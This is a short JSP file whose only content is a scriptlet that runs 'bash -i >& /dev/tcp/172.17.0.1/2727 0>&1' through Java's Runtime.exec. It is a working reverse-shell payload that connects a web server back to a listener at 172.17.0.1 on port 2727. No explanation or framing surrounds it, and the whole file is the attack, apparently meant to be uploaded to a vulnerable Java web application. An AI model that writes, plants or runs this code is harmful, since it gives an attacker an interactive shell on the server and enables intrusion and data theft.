<%
  String cmd = "bash -i >& /dev/tcp/172.17.0.1/2727 0>&1";
  Runtime rt = Runtime.getRuntime();
  Process p = rt.exec(new String[]{"/bin/bash", "-c", cmd});
%>

